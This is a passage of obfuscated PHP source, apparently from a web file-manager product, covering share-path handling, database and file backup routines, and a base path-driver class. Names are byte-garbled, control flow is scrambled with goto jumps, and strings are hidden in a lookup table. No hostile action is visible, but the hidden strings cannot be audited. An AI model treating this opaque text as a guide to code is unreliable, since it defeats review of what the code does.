IO::copyMove($b³ÖèÀ‡ÄÙ, $f”Ç¦•…àù, $f¾…¶×Ïñ§, $f¢ƒãö»ø’); $BßÌ¿åÏ = $this->getPathOuter($BßÌ¿åÏ); goto eÕ¦¶©¨Ø; eÕ¦¶©¨Ø: return $BßÌ¿åÏ; goto e‡Éê«È˜Ÿ; e‡Éê«È˜Ÿ: } public function pathFather($Fô×ëª‚) { return get_path_father($this->pathParse[$_SERVER[¦·][75]]); } public function iconvSystem($aÉÕíòÑ³Ş) { return $aÉÕíòÑ³Ş; } protected function infoParse($c·õóœ¤éØ, $b¦ÈÙØŒÎ‘ = false) { $fÊˆÕˆ§ºŒ =& $_SERVER[¦·]; $bà½ó¦íÙ‡ = $this->pathParse[$fÊˆÕˆ§ºŒ[439]][$fÊˆÕˆ§ºŒ[1022]] . $this->pathParse[$fÊˆÕˆ§ºŒ[1015]]; if ($b¦ÈÙØŒÎ‘) { $eŞæèƒŒÂÕ = IO::infoWithChildren($bà½ó¦íÙ‡); } else { $eŞæèƒŒÂÕ = IO::info($bà½ó¦íÙ‡); } $Ağ»ëäÂ¿é = $this->pathParse[$fÊˆÕˆ§ºŒ[439]]; return Action($fÊˆÕˆ§ºŒ[1129])->_shareItemeParse($eŞæèƒŒÂÕ, $Ağ»ëäÂ¿é); } public function listAll($dÎÜ‚ÜÀŠ‡) { $B±ÀšœĞ¼© =& $_SERVER[¦·]; $a£Ä‰¡¨ºè = IO::listAll($dÎÜ‚ÜÀŠ‡); $b©¢â‰´†É = $this->pathParse[$B±ÀšœĞ¼©[439]]; foreach ($a£Ä‰¡¨ºè as &$c©¡Ù‘¼·‡) { check_abort(); $c©¡Ù‘¼·‡ = array_merge(IO::info($c©¡Ù‘¼·‡[$B±ÀšœĞ¼©[75]]), $c©¡Ù‘¼·‡); $c©¡Ù‘¼·‡[$B±ÀšœĞ¼©[391]] = Action($B±ÀšœĞ¼©[1129])->_shareItemeParse($c©¡Ù‘¼·‡, $b©¢â‰´†É); } unset($c©¡Ù‘¼·‡); return $a£Ä‰¡¨ºè; } public function getPathOuter($B“îÜîØñˆ) { goto dÑø„ªÃ°; dÑø„ªÃ°: $E„ñ½›ë–» =& $_SERVER[¦·]; $fåÀ¥Ûö’ = KodIO::parse($B“îÜîØñˆ); if ($fåÀ¥Ûö’[$E„ñ½›ë–»[29]] == KodIO::KOD_SHARE_ITEM) { return $fåÀ¥Ûö’[$E„ñ½›ë–»[75]]; } goto eªÏôß¤˜§; F…öÙ†ÆáÛ: if (substr($DÕÌ²…¢ßÑ, 0, strlen($eÔŸ¦ø¶Ù)) != $eÔŸ¦ø¶Ù) { return !1; } return $this->pathParse[$E„ñ½›ë–»[1016]] . $E„ñ½›ë–»[8] . ltrim($cßÄäÑ¯Ñ·, $E„ñ½›ë–»[8]); goto Dê¹Î°ã›; eªÏôß¤˜§: $DÕÌ²…¢ßÑ = KodIO::clear($B“îÜîØñˆ); $eÔŸ¦ø¶Ù = KodIO::clear($this->pathParse[$E„ñ½›ë–»[439]][$E„ñ½›ë–»[1022]]); $cßÄäÑ¯Ñ· = substr($DÕÌ²…¢ßÑ, strlen($eÔŸ¦ø¶Ù)); goto F…öÙ†ÆáÛ; Dê¹Î°ã›: } public function getType() { $F‹×İòÌÔ =& $_SERVER[¦·]; $CÀÌíÍâ—ƒ = str_replace($F‹×İòÌÔ[71], $F‹×İòÌÔ[33], get_class($this)); return strtolower($CÀÌíÍâ—ƒ); } public function isTypeObject($bçôª™æÃ) { return IO::isTypeObject($bçôª™æÃ); } public function info($f®¥Ûùƒó) { return $this->infoParse($f®¥Ûùƒó); } public function infoAuth($Fó¿„øˆÖ¹) { return $this->infoParse($Fó¿„øˆÖ¹); } public function infoWithChildren($aÓãˆ±“‹É) { return $this->infoParse($aÓãˆ±“‹É, !0); } public function infoFull($Eá°¾…ˆš) { return $this->infoParse($Eá°¾…ˆš); } } goto B‹ù³¦œª°; B‚ñ˜©¶‡: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $C½—Ô—„‰è =& $_SERVER[¦·]; self::$name = date($C½—Ô—„‰è[688]); if (!($C´Ş‚ÜïİÏ = Model($C½—Ô—„‰è[689])->lastItem())) { $C´Ş‚ÜïİÏ = $this->initData(); } else { self::$name = $C´Ş‚ÜïİÏ[$C½—Ô—„‰è[28]]; if ($C´Ş‚ÜïİÏ[$C½—Ô—„‰è[690]] == $C½—Ô—„‰è[83]) { self::$name = date($C½—Ô—„‰è[691]); $C…óöÄ³©Ÿ = 0; if (isset($C´Ş‚ÜïİÏ[$C½—Ô—„‰è[281]][$C½—Ô—„‰è[167]][$C½—Ô—„‰è[419]])) { $C…óöÄ³©Ÿ = (int) $C´Ş‚ÜïİÏ[$C½—Ô—„‰è[281]][$C½—Ô—„‰è[167]][$C½—Ô—„‰è[419]]; } if ($C´Ş‚ÜïİÏ[$C½—Ô—„‰è[28]] == self::$name) { Model($C½—Ô—„‰è[689])->remove($C´Ş‚ÜïİÏ[$C½—Ô—„‰è[367]]); } $C´Ş‚ÜïİÏ = $this->initData($C…óöÄ³©Ÿ, $C´Ş‚ÜïİÏ[$C½—Ô—„‰è[692]]); } else { $this->checkStore($C´Ş‚ÜïİÏ[$C½—Ô—„‰è[692]]); } } self::$option = $C´Ş‚ÜïİÏ; } private function initData($aô¹£í† ƒ = 0, $b˜‚‡•§¸ = '') { goto A®’³ƒÅ£è; d­¿×Œ‰ø: $dùÆîâ±¥ê[$bÁ•¾­¤Ñ[367]] = $CËÃØˆŒŞ©; return $dùÆîâ±¥ê; goto dêŠêôƒÄ; A®’³ƒÅ£è: $bÁ•¾­¤Ñ =& $_SERVER[¦·]; $a·ÕÄø…½ = Model($bÁ•¾­¤Ñ[689])->config(); if ($b˜‚‡•§¸ && $a·ÕÄø…½[$bÁ•¾­¤Ñ[692]] != $b˜‚‡•§¸) { $aô¹£í† ƒ = 0; } goto Cµî»Š¸ê‚; Cµî»Š¸ê‚: $this->checkStore($a·ÕÄø…½[$bÁ•¾­¤Ñ[692]]); $dùÆîâ±¥ê = array($bÁ•¾­¤Ñ[692] => $a·ÕÄø…½[$bÁ•¾­¤Ñ[692]], $bÁ•¾­¤Ñ[28] => self::$name, $bÁ•¾­¤Ñ[690] => 0, $bÁ•¾­¤Ñ[693] => $a·ÕÄø…½[$bÁ•¾­¤Ñ[693]], $bÁ•¾­¤Ñ[281] => array($bÁ•¾­¤Ñ[694] => array($bÁ•¾­¤Ñ[690] => 0), $bÁ•¾­¤Ñ[695] => array($bÁ•¾­¤Ñ[690] => 0, $bÁ•¾­¤Ñ[696] => 0, $bÁ•¾­¤Ñ[697] => 0, $bÁ•¾­¤Ñ[29] => $bÁ•¾­¤Ñ[33]), $bÁ•¾­¤Ñ[698] => array($bÁ•¾­¤Ñ[690] => 0, $bÁ•¾­¤Ñ[696] => 0, $bÁ•¾­¤Ñ[697] => 0), $bÁ•¾­¤Ñ[167] => array($bÁ•¾­¤Ñ[690] => 0, $bÁ•¾­¤Ñ[699] => 0, $bÁ•¾­¤Ñ[700] => 0, $bÁ•¾­¤Ñ[701] => 0, $bÁ•¾­¤Ñ[702] => 0, $bÁ•¾­¤Ñ[419] => $aô¹£í† ƒ)), $bÁ•¾­¤Ñ[703] => time(), $bÁ•¾­¤Ñ[449] => 0); $CËÃØˆŒŞ© = Model($bÁ•¾­¤Ñ[689])->insert($dùÆîâ±¥ê); goto d­¿×Œ‰ø; dêŠêôƒÄ: } private function checkStore($BóÄ‚ÓíÚÆ) { $bãì”¶Ö =& $_SERVER[¦·]; $eÔ¨ƒ¤Ê = Model($bãì”¶Ö[704])->listData($BóÄ‚ÓíÚÆ); Model($bãì”¶Ö[704])->checkConfig($eÔ¨ƒ¤Ê); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¦·][689])->findByName(self::$name); } return self::$option; } public static function set($C •õÎòºĞ) { $eÙêÆËïÅŒ =& $_SERVER[¦·]; $Cò¥à¯óê = self::get(); foreach ($C •õÎòºĞ as $Fì½¼²İ‹ğ => $E½‚³®©) { $Fë¬Å¢Šìï = explode($eÙêÆËïÅŒ[91], $Fì½¼²İ‹ğ); $D—·«­çŞÀ = count($Fë¬Å¢Šìï); switch ($D—·«­çŞÀ) { case 1: $Cò¥à¯óê[$Fë¬Å¢Šìï[0]] = $E½‚³®©; break; case 2: $Cò¥à¯óê[$Fë¬Å¢Šìï[0]][$Fë¬Å¢Šìï[1]] = $E½‚³®©; break; case 3: $Cò¥à¯óê[$Fë¬Å¢Šìï[0]][$Fë¬Å¢Šìï[1]][$Fë¬Å¢Šìï[2]] = $E½‚³®©; break; } } Model($eÙêÆËïÅŒ[689])->update($Cò¥à¯óê[$eÙêÆËïÅŒ[367]], $Cò¥à¯óê); self::$option = $Cò¥à¯óê; return self::$option; } public function keep() { $c„’¸²Íô× =& $_SERVER[¦·]; $dã²ó›ó = self::get(); if ($dã²ó›ó[$c„’¸²Íô×[281]][$c„’¸²Íô×[694]][$c„’¸²Íô×[690]] == $c„’¸²Íô×[83]) { return; } $this->backupKeep($dã²ó›ó); self::set(array($c„’¸²Íô×[705] => 1)); } private function backupKeep($D‰²ùæ£‡¬) { goto C¶¯ˆÄƒ‡–; f•‹Î®©›: for ($b±¹–¾ÓÖ = 0; $b±¹–¾ÓÖ < 12; $b±¹–¾ÓÖ++) { $Cµ°ÚèíŠ[] = date($c™ã°…¼·Å[706], strtotime("\55{$b±¹–¾ÓÖ}\40\155\x6f\x6e\164\150\x73")); } $Cµ°ÚèíŠ = array_unique($Cµ°ÚèíŠ); foreach ($AïË±‘Ëª­ as $A‰õÁàÎ‡) { if (!empty($A‰õÁàÎ‡[$c™ã°…¼·Å[28]]) && in_array($A‰õÁàÎ‡[$c™ã°…¼·Å[28]], $Cµ°ÚèíŠ)) { continue; } Model($c™ã°…¼·Å[689])->remove($A‰õÁàÎ‡[$c™ã°…¼·Å[367]]); $eÈğµò†œ• = "\173\x69\x6f\72{$D‰²ùæ£‡¬[$c™ã°…¼·Å[692]]}\x7d\57\144\141\x74\x61\x62\141\163\145\x2f\142\141\x63\x6b\x75\x70\x5f{$A‰õÁàÎ‡[$c™ã°…¼·Å[28]]}"; IO::remove($eÈğµò†œ•, !1); } goto b¿°ºµïÙó; C„‰î§öÕê: $b±¹–¾ÓÖ = 0; $Cµ°ÚèíŠ = array(); foreach ($AïË±‘Ëª­ as $A‰õÁàÎ‡) { if ($b±¹–¾ÓÖ >= 7) { break; } $Cµ°ÚèíŠ[] = $A‰õÁàÎ‡[$c™ã°…¼·Å[28]]; $b±¹–¾ÓÖ++; } goto f•‹Î®©›; C¶¯ˆÄƒ‡–: $c™ã°…¼·Å =& $_SERVER[¦·]; $AïË±‘Ëª­ = Model($c™ã°…¼·Å[689])->listData(); if (empty($AïË±‘Ëª­)) { return; } goto C„‰î§öÕê; b¿°ºµïÙó: } public function db() { goto Dƒ‹ÕÈÍ¢Ò; aµ®ƒâôæ¼: $c‚”ˆùô™ = new BackupDb(); if (!$c‚”ˆùô™->index()) { return !1; } self::set(array($C•Ì©Âï„§[707] => 1)); goto Bí—­§”é; Bí—­§”é: return !0; goto E”öôòÚ˜ø; Dƒ‹ÕÈÍ¢Ò: $C•Ì©Âï„§ =& $_SERVER[¦·]; $a¹±†¥¿®æ = self::get(); if ($a¹±†¥¿®æ[$C•Ì©Âï„§[281]][$C•Ì©Âï„§[695]][$C•Ì©Âï„§[690]] == $C•Ì©Âï„§[83]) { return !0; } goto aµ®ƒâôæ¼; E”öôòÚ˜ø: } public function dbFile() { goto bñÊªÇ¤¢‘; a›¬„¯„ìŸ: return !0; goto a‰¹†´©¬£; bñÊªÇ¤¢‘: $e”¯Â»ÆÎÅ =& $_SERVER[¦·]; $c¨¶¨Äô = self::get(); if ($c¨¶¨Äô[$e”¯Â»ÆÎÅ[281]][$e”¯Â»ÆÎÅ[698]][$e”¯Â»ÆÎÅ[690]] == $e”¯Â»ÆÎÅ[83]) { return !0; } goto DÜ±‡¯İ’; DÜ±‡¯İ’: $fª™¨¬²ÛŠ = new BackupDbFile(); if (!$fª™¨¬²ÛŠ->index()) { return !1; } self::set(array($e”¯Â»ÆÎÅ[708] => 1)); goto a›¬„¯„ìŸ; a‰¹†´©¬£: } public function file() { $eÇŸŸŠ‘Ç =& $_SERVER[¦·]; $fäÄÈÛ–‚¶ = self::get(); if ($fäÄÈÛ–‚¶[$eÇŸŸŠ‘Ç[281]][$eÇŸŸŠ‘Ç[167]][$eÇŸŸŠ‘Ç[690]] == $eÇŸŸŠ‘Ç[83]) { return !0; } if (!isset($fäÄÈÛ–‚¶[$eÇŸŸŠ‘Ç[693]]) || $fäÄÈÛ–‚¶[$eÇŸŸŠ‘Ç[693]] == $eÇŸŸŠ‘Ç[470]) { $C±¥‡È³ = new BackupFile(); if (!$C±¥‡È³->index()) { return !1; } } self::set(array($eÇŸŸŠ‘Ç[709] => 1, $eÇŸŸŠ‘Ç[690] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto b¨Ôš“×ä¶; e¿á¯†Ìáƒ: Backup::set($Dª‰÷¿ç¥÷); return !0; goto c±˜‹Õ Ñ; C––Œâ¸ç : $cæÁÔ®¥Ò = new DbManage($Bœ©Çî™, $d˜‰®ˆª°È); $a«¸ß‚œÜ± = TEMP_FILES . $Fã³«’§©[710] . self::$name . $Fã³«’§©[8]; del_dir($a«¸ß‚œÜ±); goto dùö¦ØÍ; Dâ‹‰Ê“†­: foreach ($e®çÉ¢Ş’¹ as $CéÄíÆóÌÒ) { $CÑÄÀÌÏ = $a«¸ß‚œÜ± . $CéÄíÆóÌÒ . $Fã³«’§©[718]; $fö¡”¥ˆª = null; if ($CéÄíÆóÌÒ == $Fã³«’§©[719] && (!isset($cİ¾çëëß…[$Fã³«’§©[693]]) || $cİ¾çëëß…[$Fã³«’§©[693]] == $Fã³«’§©[470])) { $fö¡”¥ˆª = self::$io; } $f­“×±õ®— += $cæÁÔ®¥Ò->sqlFromDb($CéÄíÆóÌÒ, $CÑÄÀÌÏ, $bŞÆ…¿±ÎÅ, $fö¡”¥ˆª); } $bŞÆ…¿±ÎÅ->end(); $Dª‰÷¿ç¥÷ = array($Fã³«’§©[720] => $d˜‰®ˆª°È, $Fã³«’§©[707] => 1, $Fã³«’§©[721] => $f­“×±õ®—, $Fã³«’§©[722] => $f­“×±õ®—); goto e¿á¯†Ìáƒ; D¼Ùìõ¹õ: self::$name = $cİ¾çëëß…[$Fã³«’§©[28]]; $Bœ©Çî™ = $GLOBALS[$Fã³«’§©[6]][$Fã³«’§©[17]]; $d˜‰®ˆª°È = $this->_dbType($Bœ©Çî™); goto C––Œâ¸ç ; BÈªè•ÈÎ: $e®çÉ¢Ş’¹ = array_diff($e®çÉ¢Ş’¹, array($Fã³«’§©[711], $Fã³«’§©[712])); foreach ($e®çÉ¢Ş’¹ as $CéÄíÆóÌÒ) { $A‘ãÕ¼Ã += $cæÁÔ®¥Ò->model($CéÄíÆóÌÒ)->count(); } $bŞÆ…¿±ÎÅ = new Task($Fã³«’§©[713], $Fã³«’§©[714], $A‘ãÕ¼Ã, LNG($Fã³«’§©[715]) . $Fã³«’§©[716] . LNG($Fã³«’§©[717])); goto Dâ‹‰Ê“†­; b¨Ôš“×ä¶: $Fã³«’§© =& $_SERVER[¦·]; $cİ¾çëëß… = Backup::get(); self::$io = $cİ¾çëëß…[$Fã³«’§©[692]]; goto D¼Ùìõ¹õ; dùö¦ØÍ: mk_dir($a«¸ß‚œÜ±); $A‘ãÕ¼Ã = $f­“×±õ®— = 0; $e®çÉ¢Ş’¹ = $cæÁÔ®¥Ò->db()->getTables(); goto BÈªè•ÈÎ; c±˜‹Õ Ñ: } private function _dbType($fŸÍöÛÏˆ) { goto bÔ‘·ÇØô†; fŒé¶ƒÔãì: return $b¡½¼ãÛ; goto a‰¾çÙº«î; bÔ‘·ÇØô†: $cœÕ³¼åŠ¦ =& $_SERVER[¦·]; $fŸÍöÛÏˆ = array_change_key_case($fŸÍöÛÏˆ); $b¡½¼ãÛ = $fŸÍöÛÏˆ[$cœÕ³¼åŠ¦[723]]; goto c÷×…–²ªØ; c÷×…–²ªØ: if ($b¡½¼ãÛ == $cœÕ³¼åŠ¦[724]) { $F†£ö˜›»‹ = explode($cœÕ³¼åŠ¦[4], $fŸÍöÛÏˆ[$cœÕ³¼åŠ¦[725]]); $b¡½¼ãÛ = $F†£ö˜›»‹[0]; } $Cò®‹¾áÛ = array($cœÕ³¼åŠ¦[726] => $cœÕ³¼åŠ¦[9], $cœÕ³¼åŠ¦[727] => $cœÕ³¼åŠ¦[728]); if (isset($Cò®‹¾áÛ[$b¡½¼ãÛ])) { $b¡½¼ãÛ = $Cò®‹¾áÛ[$b¡½¼ãÛ]; } goto fŒé¶ƒÔãì; a‰¾çÙº«î: } } class BackupDbFile { public function __construct() { } public function index() { goto EˆÖì®«‘; EˆÖì®«‘: $B®ÄÍØœ =& $_SERVER[¦·]; $DÚÚÂß»ˆ = Backup::get(); $BŒÆô‘ÜŠŠ = $DÚÚÂß»ˆ[$B®ÄÍØœ[28]]; goto EÊÏö×Ë¥¥; B×¾¥µÒø: $c‡º¶ƒÒ­ = new TaskFileTransfer($B®ÄÍØœ[729], $B®ÄÍØœ[714], 0, LNG($B®ÄÍØœ[715]) . $B®ÄÍØœ[412] . LNG($B®ÄÍØœ[717]) . $B®ÄÍØœ[730]); $c‡º¶ƒÒ­->addPath($C§„ğ›Ÿ¿À); $BŸŸÃ‚øÇ¥ = IO::infoWithChildren($C§„ğ›Ÿ¿À); goto cšº²®ö¡˜; c—˜Û¡“Ò: $c‡º¶ƒÒ­->end(); Backup::set(array($B®ÄÍØœ[734] => $BŸŸÃ‚øÇ¥[$B®ÄÍØœ[77]])); return !0; goto BœØÓÃäó©; EÊÏö×Ë¥¥: $C§„ğ›Ÿ¿À = TEMP_FILES . "\x62\141\x63\153\165\160\137{$BŒÆô‘ÜŠŠ}\57"; $eæõ²Ÿâ¸Æ = "\173\151\x6f\x3a{$DÚÚÂß»ˆ[$B®ÄÍØœ[692]]}\x7d\x2f\144\x61\164\141\x62\141\x73\x65\57"; IO::mkdir($eæõ²Ÿâ¸Æ . "\x62\141\x63\153\165\x70\x5f{$BŒÆô‘ÜŠŠ}\57"); goto B×¾¥µÒø; F¨Òíˆ¤ÉŸ: $B‡ùòŠ›Ø = CONTROLLER_DIR . $B®ÄÍØœ[733]; IO::copy($BÔà½îºƒ, $eæõ²Ÿâ¸Æ . "\142\141\x63\153\165\x70\137{$BŒÆô‘ÜŠŠ}\x2f"); IO::copy($B‡ùòŠ›Ø, $eæõ²Ÿâ¸Æ . "\142\x61\143\153\165\x70\x5f{$BŒÆô‘ÜŠŠ}\57"); goto c—˜Û¡“Ò; cšº²®ö¡˜: Backup::set(array($B®ÄÍØœ[731] => $BŸŸÃ‚øÇ¥[$B®ÄÍØœ[77]])); IO::move($C§„ğ›Ÿ¿À, $eæõ²Ÿâ¸Æ); $BÔà½îºƒ = CONTROLLER_DIR . $B®ÄÍØœ[732]; goto F¨Òíˆ¤ÉŸ; BœØÓÃäó©: } } goto B‡¼Ãœ”¤º; d´‹ÊÉŒ¼: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $a‰âí“ƒ =& $_SERVER[¦·]; $this->objectDriver = array($a‰âí“ƒ[57], $a‰âí“ƒ[58], $a‰âí“ƒ[59], $a‰âí“ƒ[60], $a‰âí“ƒ[61], $a‰âí“ƒ[62], $a‰âí“ƒ[63], $a‰âí“ƒ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($E¬ˆÓŸƒæØ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($E¬ˆÓŸƒæØ, $_SERVER[¦·][8]); } return $E¬ˆÓŸƒæØ; } public function getPathName($BÏéÁÀŠäŒ) { return $BÏéÁÀŠäŒ; } public function iconvApp($EÔî ªÜÊÙ) { return $EÔî ªÜÊÙ; } public function iconvSystem($FÏô–„…ñ“) { return $FÏô–„…ñ“; } public function iconvTo($d¥×·ÁÏä, $B¸Ÿº…‹§, $Aí‚õæö‰®) { goto eƒŞ±Å«²; c“ù‚ÇóÎ: $AÔ¬ˆŠäŠÆ = $B¸Ÿº…‹§ . $Fº›Ã¸î†ã[66] . $Aí‚õæö‰® . $Fº›Ã¸î†ã[67] . $d¥×·ÁÏä; if (isset($AÜùÇ¥‡¤ƒ[$AÔ¬ˆŠäŠÆ])) { return $AÜùÇ¥‡¤ƒ[$AÔ¬ˆŠäŠÆ]; } if (function_exists($Fº›Ã¸î†ã[68])) { $Cª¤ˆ¾Ö… = @mb_convert_encoding($d¥×·ÁÏä, $Aí‚õæö‰®, $B¸Ÿº…‹§); } else { $Cª¤ˆ¾Ö… = @iconv($B¸Ÿº…‹§, $Aí‚õæö‰®, $d¥×·ÁÏä); } goto dÌ®¸ÁÎ¬ª; aå¦–ÎĞµ³: return $Cª¤ˆ¾Ö…; goto CØô”ï›…Ş; eƒŞ±Å«²: $Fº›Ã¸î†ã =& $_SERVER[¦·]; if (!$d¥×·ÁÏä || !function_exists($Fº›Ã¸î†ã[65])) { return $d¥×·ÁÏä; } static $AÜùÇ¥‡¤ƒ = array(); goto c“ù‚ÇóÎ; eğ¦æ±º ï: $AÜùÇ¥‡¤ƒ[$Aí‚õæö‰® . $Fº›Ã¸î†ã[66] . $B¸Ÿº…‹§ . $Fº›Ã¸î†ã[67] . $d¥×·ÁÏä] = $d¥×·ÁÏä; $AÜùÇ¥‡¤ƒ[$Aí‚õæö‰® . $Fº›Ã¸î†ã[66] . $B¸Ÿº…‹§ . $Fº›Ã¸î†ã[67] . $Cª¤ˆ¾Ö…] = $d¥×·ÁÏä; $AÜùÇ¥‡¤ƒ[$B¸Ÿº…‹§ . $Fº›Ã¸î†ã[66] . $Aí‚õæö‰® . $Fº›Ã¸î†ã[67] . $Cª¤ˆ¾Ö…] = $Cª¤ˆ¾Ö…; goto aå¦–ÎĞµ³; dÌ®¸ÁÎ¬ª: $Cª¤ˆ¾Ö… = $Cª¤ˆ¾Ö… ? $Cª¤ˆ¾Ö… : $d¥×·ÁÏä; if (strstr($Cª¤ˆ¾Ö…, $Fº›Ã¸î†ã[69])) { $Cª¤ˆ¾Ö… = str_replace($Fº›Ã¸î†ã[69], $Fº›Ã¸î†ã[70], $Cª¤ˆ¾Ö…); } $AÜùÇ¥‡¤ƒ[$B¸Ÿº…‹§ . $Fº›Ã¸î†ã[66] . $Aí‚õæö‰® . $Fº›Ã¸î†ã[67] . $d¥×·ÁÏä] = $Cª¤ˆ¾Ö…; goto eğ¦æ±º ï; CØô”ï›…Ş: } public function getPathInner($D…«÷ÕÁ¨¦) { $Cù°«ˆàÇƒ = IO::init($D…«÷ÕÁ¨¦); return $Cù°«ˆàÇƒ->path; } public function getPathOuter($F³‘¼ÓĞ§) { $D‰ÙŠä»îÔ =& $_SERVER[¦·]; $fæÁî“¥˜˜ = strlen(trim($this->pathBase, $D‰ÙŠä»îÔ[8])); $F³‘¼ÓĞ§ = substr(trim($F³‘¼ÓĞ§, $D‰ÙŠä»îÔ[8]), $fæÁî“¥˜˜); return $this->pathDriver . $D‰ÙŠä»îÔ[8] . ltrim($F³‘¼ÓĞ§, $D‰ÙŠä»îÔ[8]); } public function isParentOf($D«°÷ğÙ‡ª, $b¦·Ãë¼Ş) { $E„´’”Í =& $_SERVER[¦·]; $D«°÷ğÙ‡ª = rtrim(strtolower($D«°÷ğÙ‡ª), $E„´’”Í[8]) . $E„´’”Í[8]; $b¦·Ãë¼Ş = rtrim(strtolower($b¦·Ãë¼Ş), $E„´’”Í[8]) . $E„´’”Í[8]; $AòŒË­ = strpos($b¦·Ãë¼Ş, $D«°÷ğÙ‡ª) === 0; return $AòŒË­; } public function getType() { $Eà¨îí•Ã =& $_SERVER[¦·]; $D“¥ÎÚ­í = str_replace($Eà¨îí•Ã[71], $Eà¨îí•Ã[33], get_class($this)); return strtolower($D“¥ÎÚ­í); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($D§¼äºŠŞ¨, $C­Á‚ÅÜ­²) { $b•Ä‰Ğ­¬Ç =& $_SERVER[¦·]; $C¡êÎ¾µîÇ = rtrim($D§¼äºŠŞ¨, $b•Ä‰Ğ­¬Ç[8]) . $b•Ä‰Ğ­¬Ç[8] . $C­Á‚ÅÜ­²; $bÛíĞ¥ØõÅ = $this->exist($C¡êÎ¾µîÇ); return $bÛíĞ¥ØõÅ ? $C¡êÎ¾µîÇ : !1; } public function setModifyTime($a÷¤Ô£áÅÃ, $bÛâ§ÍÜŠ˜ = '') { } public function renameObject($cÁ¡Ù”œí, $aÎ°íµÎÓ†) { goto a†‡ñµŸ¹“; cÚÎ¸›Ò¶¹: $cÁ¡Ù”œí = $this->getPathOuter($cÁ¡Ù”œí); $aÎ°íµÎÓ† = $this->pathFather($cÁ¡Ù”œí) . $aÎ°íµÎÓ†; if (IO::isFile($cÁ¡Ù”œí)) { $E‹„Êˆ©· = IO::copy($cÁ¡Ù”œí, $this->pathFather($cÁ¡Ù”œí), REPEAT_RENAME_FOLDER, $cïéâ“†â); if ($E‹„Êˆ©·) { IO::remove($cÁ¡Ù”œí); } } else { $E‹„Êˆ©· = IO::mkdir($aÎ°íµÎÓ†); if (!$E‹„Êˆ©·) { return !1; } $dØî’Æ³Œà = IO::listPath($cÁ¡Ù”œí, !0); $Bƒš„©½™ = array_merge($dØî’Æ³Œà[$A›ïñ¾éœ•[73]], $dØî’Æ³Œà[$A›ïñ¾éœ•[74]]); foreach ($Bƒš„©½™ as $Eó‘“¡‘Â) { IO::move($Eó‘“¡‘Â[$A›ïñ¾éœ•[75]], $aÎ°íµÎÓ†, REPEAT_RENAME_FOLDER); } IO::remove($cÁ¡Ù”œí); } goto dïÛ©ÛÔ¸‹; a†‡ñµŸ¹“: $A›ïñ¾éœ• =& $_SERVER[¦·]; $cïéâ“†â = $aÎ°íµÎÓ†; Hook::trigger($A›ïñ¾éœ•[72], $this, $cÁ¡Ù”œí, $this, $this->pathFather($cÁ¡Ù”œí) . $aÎ°íµÎÓ†); goto cÚÎ¸›Ò¶¹; dïÛ©ÛÔ¸‹: return $E‹„Êˆ©· ? $aÎ°íµÎÓ† : !1; goto d·Æ¤œæ‹Ñ; d·Æ¤œæ‹Ñ: } public function tempFile($FÃ±Ğšºø = '', $B‡¢…Í´¨ = '') { goto dö™†ì‚¾‹; dö™†ì‚¾‹: if (!$FÃ±Ğšºø) { $FÃ±Ğšºø = rand_string(15); } $D¸†ßâíĞ‰ = TEMP_FILES . rand_string(15) . $_SERVER[¦·][8]; @mkdir($D¸†ßâíĞ‰, 511, !0); goto EåøóˆôÆ; EåøóˆôÆ: $c˜ÌçÖº÷ = $D¸†ßâíĞ‰ . $FÃ±Ğšºø; @touch($c˜ÌçÖº÷); if ($B‡¢…Í´¨) { file_put_contents($c˜ÌçÖº÷, $B‡¢…Í´¨); } goto aò†¨—Š; aò†¨—Š: return $c˜ÌçÖº÷; goto cŞÑÖ¦—Òä; cŞÑÖ¦—Òä: } public function tempFileRemve($BÅŒğõ·†Ğ) { @unlink($BÅŒğõ·†Ğ); @rmdir($this->pathFather($BÅŒğõ·†Ğ)); } public function mkfile($böªİ‘‹ÎÂ, $c•é¶ñÜ¦ = '', $eÄƒÆá¯ = REPEAT_RENAME) { } public function mkdir($B®ïŠ‹šçŠ, $eÍéÖÊª = REPEAT_SKIP) { } public function delFile($cíï¿ºËÚğ) { } public function delFolder($Cù¨¯Áä) { } public function copyFile($DËŠ¦Ğ²Œ, $d×ôÀ“Ï”) { } public function moveFile($BŞ¸‹Š®‰¢, $bš Í˜á÷) { } public function remove($eÆ¥ìÈ³ã) { if ($this->isFile($eÆ¥ìÈ³ã)) { return $this->delFile($eÆ¥ìÈ³ã); } return $this->delFolder($eÆ¥ìÈ³ã); } public function rename($cùŸÛ‘æÏ, $D¸ˆÒ®õ°š) { } public function exist($fÏÀÕ­˜ó) { } public function findByHash($b©£ ĞÆÉ = '', $b¢óÄ¬÷¯ = '') { return !1; } public function isFile($eÜ¸À¤ñ¦) { } public function isFolder($CµëÄåğ¸ñ) { } public function size($D‹Ö÷Œ¡çğ) { } public function info($BÉ¶ğõ–ã¾) { } public function infoSimple($fÙ­æÒ³Ë) { return $this->info($fÙ­æÒ³Ë); } public function infoAuth($dÍİÇÈÓá) { return $this->info($dÍİÇÈÓá); } public function infoFull($e‰¾¦Œ¬øõ) { return $this->info($e‰¾¦Œ¬øõ); } public function infoWithChildren($A‰î×Ë…£î) { $dÅİãªÃË§ =& $_SERVER[¦·]; static $f»Â²§ï‹Õ = array(); if (isset($f»Â²§ï‹Õ[$A‰î×Ë…£î])) { return $f»Â²§ï‹Õ[$A‰î×Ë…£î]; } $b‚×„Ã•¯ = $this->info($A‰î×Ë…£î); if ($b‚×„Ã•¯ && $b‚×„Ã•¯[$dÅİãªÃË§[29]] == $dÅİãªÃË§[76]) { $AŒœ¾’ŠëŒ = array($dÅİãªÃË§[77] => 0, $dÅİãªÃË§[78] => 0, $dÅİãªÃË§[79] => 0); $this->infoChildren($A‰î×Ë…£î, $AŒœ¾’ŠëŒ); $b‚×„Ã•¯[$dÅİãªÃË§[77]] = $AŒœ¾’ŠëŒ[$dÅİãªÃË§[77]]; $b‚×„Ã•¯[$dÅİãªÃË§[80]] = array($dÅİãªÃË§[81] => $AŒœ¾’ŠëŒ[$dÅİãªÃË§[78]], $dÅİãªÃË§[82] => $AŒœ¾’ŠëŒ[$dÅİãªÃË§[79]]); 